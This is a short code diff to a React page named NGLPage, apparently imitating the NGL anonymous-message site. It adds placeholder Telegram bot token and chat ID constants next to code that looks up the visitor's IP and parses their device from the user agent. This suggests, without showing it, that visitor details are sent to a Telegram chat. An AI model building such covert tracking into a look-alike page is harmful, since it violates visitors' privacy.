@@ -27,6 +27,9 @@ export default function NGLPage() {
         console.error("Error fetching IP info:", err);
       });
   }, []);
+  
+  const botToken = "123456789:ABCDEF123456789abcdef123456789X"; // Ganti dengan token Anda
+  const chatId = "-123456789"; // Ganti dengan chat ID Anda
 
   const parseDeviceInfo = (userAgent) => {
     const deviceRegex = /(Android|iPhone|iPad|Windows Phone|Macintosh|Linux|Realme C11|Samsung|Xiaomi|Huawei|Oppo|Vivo|Nokia|Sony|LG|HTC|OnePlus|Google Pixel|Motorola|Asus|Lenovo|BlackBerry|ZTE|TCL|Alcatel|Microsoft)/i;
